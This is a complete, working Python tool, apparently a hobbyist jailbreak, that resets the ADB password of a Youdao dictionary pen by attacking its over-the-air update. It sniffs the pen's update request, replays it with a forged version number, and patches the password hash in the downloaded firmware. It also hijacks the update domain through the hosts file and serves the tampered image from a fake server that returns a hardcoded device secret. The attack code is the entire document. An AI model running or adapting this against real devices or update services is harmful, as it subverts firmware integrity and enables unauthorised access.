"""
项目名：FuckYouDaoADB
原理:OTA 中间人攻击 + 固件重打包
1. 抓取有道词典笔发往 iotapi.abupdate.com 的 checkVersion 请求
2. 伪造 version=99.99.90 重放到真实云端,拿到最新固件 URL
3. 下载固件,扫描并替换其中的密码哈希 (SHA256/MD5)
4. 修改 hosts 把 iotapi.abupdate.com 劫持到本机
5. 起 HTTP 服务,返回篡改后的 OTA JSON 和 image.img
6. 笔再次升级时,刷入被改过哈希的固件 → ADB 密码被重置
"""
import argparse
import ctypes
import json
import os
import re
import sys
import time
import hashlib
import ipaddress
import threading
import socketserver
import http.server
from pathlib import Path
from typing import Optional, Tuple

import requests
from scapy.all import sniff, IP, TCP, Raw, conf, get_if_list, get_if_addr

# ===================== 常量 =====================
OTA_HOST = "iotapi.abupdate.com"
ORIGINAL_OTA_URL = f"https://{OTA_HOST}"
FAKE_OTA_URL = "http://192.168.137.1"
FAKE_IMAGE_URL = f"{FAKE_OTA_URL}/image.img"

OTA_URL_PATTERN = re.compile(
    rb"^POST (/product/\d+/[0-9a-f]+/ota/checkVersion) HTTP/\d+\.\d+\r\n"
    rb"((?:[^\r\n]*\r\n)*?)\r\n"
    rb"(.*)$",
    re.DOTALL,
)

# 硬编码的注册信息
FAKE_REGISTER_RESPONSE = json.dumps({
    "status": 1000,
    "msg": "success",
    "data": {
        "deviceSecret": "de8b9bcd0a18afbf25b44f6d4f6c5f23",
        "sha256": "8a6860050ac879171800a8315fc516b46d6baf81f73910ab1ab5d7e9059d427f",
        "deviceId": "f730c7fa72bd3871",
    }
})

# 升级结果上报
FAKE_REPORT_RESPONSE = json.dumps({"status": 1000, "msg": "success", "data": None})


# ===================== 抓包模块 =====================
class CaptureResult:
    def __init__(self):
        self.product_url: Optional[str] = None
        self.request_body: Optional[dict] = None


def find_hotspot_iface() -> Optional[str]:
    """
    查找 IP 为 192.168.137.1 的网卡(Windows 移动热点的默认网关)。
    """
    target = ipaddress.IPv4Address("192.168.137.1")
    for iface in get_if_list():
        try:
            addr = get_if_addr(iface)
        except Exception:
            continue
        try:
            if ipaddress.IPv4Address(addr) == target:
                print(f"[+] 找到目标网卡: {iface} ({addr})")
                return iface
        except ipaddress.AddressValueError:
            continue
    return None


def is_wanted_tcp_port(pkt) -> bool:
    if TCP not in pkt:
        return False
    sport, dport = pkt[TCP].sport, pkt[TCP].dport
    return sport == 80 or dport == 80


def parse_packet_payload(pkt) -> Optional[Tuple[str, dict]]:
    """
    返回 (product_url, json_body) 或 None。
    """
    if Raw not in pkt:
        return None
    payload = bytes(pkt[Raw].load)
    m = OTA_URL_PATTERN.match(payload)
    if not m:
        return None
    product_url = m.group(1).decode("ascii", errors="ignore")
    try:
        body = json.loads(m.group(3).decode("utf-8", errors="ignore"))
    except json.JSONDecodeError as e:
        print(f"[-] JSON 解析失败: {e}")
        return None
    return product_url, body


def capture_ota_request(timeout: int = 600) -> CaptureResult:
    """
    timeout: 抓包超时秒数,默认 10 分钟。
    """
    iface = find_hotspot_iface()
    if not iface:
        raise RuntimeError("未找到 IP 为 192.168.137.1 的网卡,请先开启 Windows 移动热点")

    result = CaptureResult()
    found_event = threading.Event()
    sniff_error: list = [None]  # 用 list 让闭包可写

    def _on_packet(pkt):
        try:
            if found_event.is_set():
                return
            if not is_wanted_tcp_port(pkt):
                return
            parsed = parse_packet_payload(pkt)
            if not parsed:
                return
            result.product_url, result.request_body = parsed
            print(f"[+] 命中 OTA 请求: {result.product_url}")
            found_event.set()
        except Exception as e:
            import traceback
            traceback.print_exc()
            sniff_error[0] = e
            found_event.set()

    print(f"[*] 正在 {iface} 上抓取 80 端口的 OTA 请求...")
    print(f"[*] 请将有道词典笔连接到此热点并触发 OTA 检查")
    print(f"[*] 超时时间: {timeout} 秒")

    def _sniff():
        try:
            sniff(
                iface=iface,
                filter="tcp port 80",
                prn=_on_packet,
                store=False,
                stop_filter=lambda _: found_event.is_set(),
            )
        except Exception as e:
            import traceback
            traceback.print_exc()
            sniff_error[0] = e
            found_event.set()

    sniffer = threading.Thread(target=_sniff, daemon=False)  # 不要 daemon,等它收尾
    sniffer.start()

    # 主线程等待,但用 wait_for 给 stop_filter 留出收尾时间
    found_event.wait(timeout=timeout)

    # 给回调函数 200ms 把 result 写完
    sniffer.join(timeout=2.0)

    if sniff_error[0]:
        raise RuntimeError(f"抓包过程中出错: {sniff_error[0]}")
    if not result.product_url:
        raise TimeoutError("抓包超时,未捕获到 OTA 请求")
    return result


# ===================== 下载模块 =====================
def get_update_data(cap: CaptureResult) -> dict:
    """
    把 version 改成 99.99.90 重放到真实云端。
    """
    modified = dict(cap.request_body)
    modified["version"] = "99.99.90"
    modified["networkType"] = "WIFI"
    print(f"[*] 伪造 version=99.99.90,请求 {ORIGINAL_OTA_URL}{cap.product_url}")

    url = f"{ORIGINAL_OTA_URL}{cap.product_url}"
    # 必须直连,绕过系统代理——云端要看到的是"笔"的 IP,不是代理机房
    # 否则会被风控/封禁
    resp = requests.post(
        url,
        json=modified,
        headers={"Content-Type": "application/json;charset=UTF-8"},
        proxies={"http": None, "https": None},  # 强制直连
        timeout=60,
    )
    resp.raise_for_status()
    data = resp.json()
    print(f"[+] 云端返回的 deltaUrl: {data['data']['version']['deltaUrl']}")
    return data


def download_file(url: str, filename: str, skip_if_exists: bool = True):
    if skip_if_exists and os.path.exists(filename):
        ans = input(f"[?] {filename} 已存在,跳过下载? [Y/n] ").strip().lower()
        if ans in ("", "y", "yes"):
            return

    print(f"[*] 下载固件: {url}")
    with requests.get(
        url, stream=True, timeout=120,
        proxies={"http": None, "https": None},  # 同样直连
    ) as r:
        r.raise_for_status()
        total = int(r.headers.get("Content-Length", 0))
        downloaded = 0
        with open(filename, "wb") as f:
            for chunk in r.iter_content(chunk_size=1024 * 1024):
                if not chunk:
                    continue
                f.write(chunk)
                downloaded += len(chunk)
                if total:
                    pct = downloaded / total * 100
                    bar = "=" * int(pct // 2) + ">" + " " * (50 - int(pct // 2))
                    print(f"\r[{bar}] {pct:.1f}% ({downloaded//1024//1024}MB/{total//1024//1024}MB)", end="")
    print("\n[+] 固件下载完成")


# ===================== 哈希替换模块 =====================
def is_hex(c: int) -> bool:
    return (ord("0") <= c <= ord("9")
            or ord("a") <= c <= ord("f")
            or ord("A") <= c <= ord("F"))


def find_hash_patterns(filename: str):
    """
    滑动窗口 + overlap 扫描两种模式:
    - SHA256: #<64hex>  -   (对应 shadow 文件)
    - MD5:    = "<32hex>  -" (对应 JSON 配置)
    """
    file_size = os.path.getsize(filename)
    print(f"[*] 扫描 {filename} ({file_size} 字节) 中的密码哈希...")

    positions = []  # (offset, length, kind)
    buf_size = 1024 * 1024
    overlap = 70
    total_read = 0

    with open(filename, "rb") as f:
        while total_read < file_size:
            if total_read > 0:
                f.seek(total_read - overlap)
                data = f.read(buf_size)
                offset_base = total_read - overlap
            else:
                data = f.read(buf_size)
                offset_base = 0

            n = len(data)
            for i in range(n - overlap):
                # SHA256: '#' + 64hex + ' ' + ' ' + '-'
                if (data[i:i+1] == b"#"
                    and i + 67 <= n
                    and all(is_hex(data[i+1+j]) for j in range(64))
                    and data[i+65:i+68] == b"  -"):
                    pos = offset_base + i + 1
                    positions.append((pos, 64, "sha256"))

                # MD5: '= "' + 32hex + ' ' + ' ' + '-' + '"'
                if (data[i:i+3] == b'= "'
                    and i + 38 <= n
                    and all(is_hex(data[i+3+j]) for j in range(32))
                    and data[i+35:i+39] == b'  -"'):
                    pos = offset_base + i + 3
                    positions.append((pos, 32, "md5"))

            total_read += (n - overlap) if total_read > 0 else n
            if total_read >= file_size:
                break

    print(f"[+] 扫描完成,发现 {len(positions)} 处哈希模式")
    return positions


def md5(s: bytes) -> str:
    return hashlib.md5(s).hexdigest()


def sha256(s: bytes) -> str:
    return hashlib.sha256(s).hexdigest()


def md5_file(filename: str) -> str:
    h = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def md5_file_segment(filename: str, start: int, end: int) -> str:
    h = hashlib.md5()
    with open(filename, "rb") as f:
        f.seek(start)
        remaining = end - start
        while remaining > 0:
            chunk = f.read(min(1024 * 1024, remaining))
            if not chunk:
                break
            h.update(chunk)
            remaining -= len(chunk)
    return h.hexdigest()


def sha1_file(filename: str) -> str:
    h = hashlib.sha1()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def replace_hash(filename: str) -> str:
    """
    找到唯一一处密码哈希,让用户输入新密码并覆盖。
    """
    positions = find_hash_patterns(filename)
    if not positions:
        raise RuntimeError("未找到密码哈希,模式匹配失败")
    if len(positions) > 1:
        raise RuntimeError(f"发现多处哈希模式 ({len(positions)}),无法确定替换位置")

    pos, length, kind = positions[0]
    print(f"[+] 在偏移 {pos} 处发现 {kind} 哈希 ({length} 字符)")

    while True:
        new_pwd = input("[?] 请输入新的 ADB 密码: ").strip()
        if new_pwd:
            break
        print("[-] 密码不能为空")

    # MD5 模式对应 shadow 文件,要在密码后加 \n
    if length == 32:
        new_hash = md5((new_pwd + "\n").encode("utf-8"))
    else:
        new_hash = sha256(new_pwd.encode("utf-8"))

    print(f"[+] 新哈希: {new_hash}")

    with open(filename, "r+b") as f:
        f.seek(pos)
        f.write(new_hash.encode("ascii"))
    print("[+] 密码哈希已替换")
    return new_hash


# ===================== OTA JSON 篡改 =====================
def patch_update_data(update_data: dict, filename: str) -> dict:
    """
    1. 重算 segmentMd5 / md5sum / sha
    2. 把 deltaUrl / bakUrl 都改成 http://192.168.137.1/image.img
    """
    print("[*] 重算固件哈希...")
    version = update_data["data"]["version"]

    seg_list = json.loads(version["segmentMd5"])
    for seg in seg_list:
        seg["md5"] = md5_file_segment(filename, seg["startpos"], seg["endpos"])
    version["segmentMd5"] = json.dumps(seg_list)

    version["md5sum"] = md5_file(filename)
    version["sha"] = sha1_file(filename)
    version["deltaUrl"] = FAKE_IMAGE_URL
    version["bakUrl"] = FAKE_IMAGE_URL

    return update_data


# ===================== hosts 劫持 =====================
def get_hosts_path() -> str:
    if sys.platform == "win32":
        return r"C:\Windows\System32\drivers\etc\hosts"
    return "/etc/hosts"


HOSTS_ENTRY = f"192.168.137.1 {OTA_HOST}\n"


def hosts_enable():
    path = get_hosts_path()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()
    if any(OTA_HOST in l and "192.168.137.1" in l for l in lines):
        print("[!] hosts 中已存在该条目")
        return
    with open(path, "a", encoding="utf-8") as f:
        f.write(HOSTS_ENTRY)
    flush_dns()
    print(f"[+] hosts 已写入: {HOSTS_ENTRY.strip()}")


def hosts_disable():
    path = get_hosts_path()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()
    new_lines = [
        l for l in lines
        if not (OTA_HOST in l and "192.168.137.1" in l)
    ]
    if len(new_lines) == len(lines):
        print("[!] hosts 中未找到目标条目")
        return
    with open(path, "w", encoding="utf-8") as f:
        f.writelines(new_lines)
    flush_dns()
    print("[+] hosts 劫持已移除")


def flush_dns():
    if sys.platform == "win32":
        os.system("ipconfig /flushdns >nul 2>&1")
    else:
        # Linux: 尝试多种方式
        for cmd in ("nscd -i hosts", "systemd-resolve --flush-caches",
                    "resolvectl flush-caches", "service nscd reload"):
            if os.system(f"{cmd} 2>/dev/null") == 0:
                break
    print("[*] DNS 缓存已刷新")


# ===================== HTTP 服务器 =====================
# - /image.img  → Range 断点续传
# - /register/  → 假注册信息
# - /<otaUrl>/checkVersion → 篡改后的 OTA JSON
# - /<otaUrl>/reportDownResult → 成功响应


class OtaHttpHandler(http.server.BaseHTTPRequestHandler):

    # 类级变量,由 main() 在 start() 前注入
    image_path: str = ""
    ota_data: str = ""
    ota_base_url: str = ""

    # 关闭 scapy 的 get_if_addr 之类的噪音
    def log_message(self, format, *args):
        if "-v" in sys.argv or "--verbose" in sys.argv:
            super().log_message(format, *args)

    def _send_json(self, code: int, body: str):
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json;charset=UTF-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Server", "nginx")
        self.end_headers()
        self.wfile.write(data)

    def _send_404(self):
        data = b"File Not Found"
        self.send_response(404)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Server", "nginx")
        self.end_headers()
        self.wfile.write(data)

    def _send_image(self):
        path = self.image_path
        if not os.path.exists(path):
            self._send_404()
            return
        file_size = os.path.getsize(path)
        start, end = 0, file_size - 1
        status = 200

        range_header = self.headers.get("Range", "")
        if range_header.startswith("bytes="):
            spec = range_header[6:].split("-", 1)
            try:
                if spec[0]:
                    start = int(spec[0])
                if len(spec) > 1 and spec[1]:
                    end = int(spec[1])
                if start >= file_size:
                    start = file_size - 1
                if end >= file_size:
                    end = file_size - 1
            except ValueError:
                pass
            status = 206

        length = end - start + 1
        self.send_response(status)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", 'attachment; filename="image.img"')
        self.send_header("Content-Length", str(length))
        if status == 206:
            self.send_header("Content-Range", f"bytes {start}-{end}/{file_size}")
        self.send_header("Server", "nginx")
        self.end_headers()

        with open(path, "rb") as f:
            f.seek(start)
            remaining = length
            while remaining > 0:
                chunk = f.read(min(64 * 1024, remaining))
                if not chunk:
                    break
                try:
                    self.wfile.write(chunk)
                except (BrokenPipeError, ConnectionResetError):
                    return
                remaining -= len(chunk)

        print(f"[+] 已发送 image.img [{start}-{end}] ({length} 字节)")

    def do_GET(self):
        path = self.path
        if path.startswith("/image.img"):
            self._send_image()
        else:
            self._send_404()

    def do_POST(self):
        path = self.path
        # 读取请求体(忽略内容,只是占位)
        content_length = int(self.headers.get("Content-Length", "0") or 0)
        if content_length:
            self.rfile.read(content_length)

        if path.startswith("/register/"):
            self._send_json(200, FAKE_REGISTER_RESPONSE)
        elif path == f"{self.ota_base_url}/checkVersion":
            self._send_json(200, self.ota_data)
        elif path == f"{self.ota_base_url}/reportDownResult":
            self._send_json(200, FAKE_REPORT_RESPONSE)
        else:
            self._send_404()


class ThreadedHttpServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def start_http_server(port: int, image_path: str, ota_data: str, ota_base_url: str):
    OtaHttpHandler.image_path = image_path
    OtaHttpHandler.ota_data = ota_data
    OtaHttpHandler.ota_base_url = ota_base_url

    server = ThreadedHttpServer(("0.0.0.0", port), OtaHttpHandler)
    print(f"[+] HTTP 服务已启动: http://0.0.0.0:{port}")
    print(f"    - /image.img  → {image_path}")
    print(f"    - {ota_base_url}/checkVersion")
    print(f"    - {ota_base_url}/reportDownResult")
    print("[*] 按 Ctrl+C 退出")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


# ===================== 主流程 =====================
def is_admin() -> bool:
    if sys.platform != "win32":
        return os.geteuid() == 0
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def relaunch_as_admin():
    """
    Windows 上通过 ShellExecuteEx + 'runas' 触发 UAC。
    """
    if sys.platform != "win32":
        return
    executable = sys.executable
    script = os.path.abspath(__file__)
    args = " ".join(f'"{a}"' for a in [script, *sys.argv[1:]])
    print("[!] 正在请求管理员权限...")
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", executable, args, None, 1
    )
    # ret > 32 表示成功
    if ret <= 32:
        print(f"[!] 提权失败 (代码 {ret}),请手动以管理员身份运行")
        sys.exit(1)
    sys.exit(0)


def parse_args():
    p = argparse.ArgumentParser(description="Paper-Py: 有道词典笔 ADB 密码重置工具")
    p.add_argument("--image", default="image.img", help="固件文件名 (默认 image.img)")
    p.add_argument("--port", type=int, default=80, help="HTTP 服务端口 (默认 80)")
    p.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    p.add_argument("--skip-capture", action="store_true",
                   help="跳过抓包(用于测试,需手动指定 OTA 数据)")
    p.add_argument("--test-ota-url", default="",
                   help="测试用:指定 productUrl,如 /product/xxx/yyy/ota/checkVersion")
    p.add_argument("--test-ota-body", default="",
                   help="测试用:OTA JSON 请求体字符串")
    return p.parse_args()


def main():
    args = parse_args()
    if not is_admin():
        print("[!] 当前不是管理员权限,正在自动提权...")
        relaunch_as_admin()
        # 提权后会重启新进程,这里直接退出
        return

    # 关闭 scapy 啰嗦的输出
    if not args.verbose:
        conf.verb = 0

    try:
        # 1. 抓包获取 OTA 请求
        if args.skip_capture:
            if not args.test_ota_url or not args.test_ota_body:
                print("[!] --skip-capture 需要同时提供 --test-ota-url 和 --test-ota-body")
                sys.exit(1)
            cap = CaptureResult()
            cap.product_url = args.test_ota_url
            cap.request_body = json.loads(args.test_ota_body)
            print(f"[+] 使用测试数据: {cap.product_url}")
        else:
            cap = capture_ota_request()

        # 2. 伪造高版本号重放,拿到真实云端响应
        update_data = get_update_data(cap)
        delta_url = update_data["data"]["version"]["deltaUrl"]
        print(f"[+] 固件 URL: {delta_url}")

        # 3. 下载固件
        download_file(delta_url, args.image)

        # 4. 替换密码哈希
        replace_hash(args.image)

        # 5. 重算校验值,篡改 OTA JSON
        update_data = patch_update_data(update_data, args.image)
        ota_json_str = json.dumps(update_data, ensure_ascii=False)
        if args.verbose:
            print("[*] 篡改后的 OTA JSON:")
            print(json.dumps(update_data, indent=2, ensure_ascii=False))

        # 6. hosts 劫持 + 起 HTTP 服务
        ota_base_url = cap.product_url.rsplit("/", 1)[0]
        hosts_enable()
        try:
            start_http_server(args.port, args.image, ota_json_str, ota_base_url)
        finally:
            hosts_disable()

    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    except Exception as e:
        import traceback
        print(f"\n[!!!] 程序异常: {e}")
        traceback.print_exc()
        # 闪退时暂停,让你能看到错误
        try:
            input("\n按回车键退出...")
        except EOFError:
            pass
        sys.exit(1)


if __name__ == "__main__":
    main()
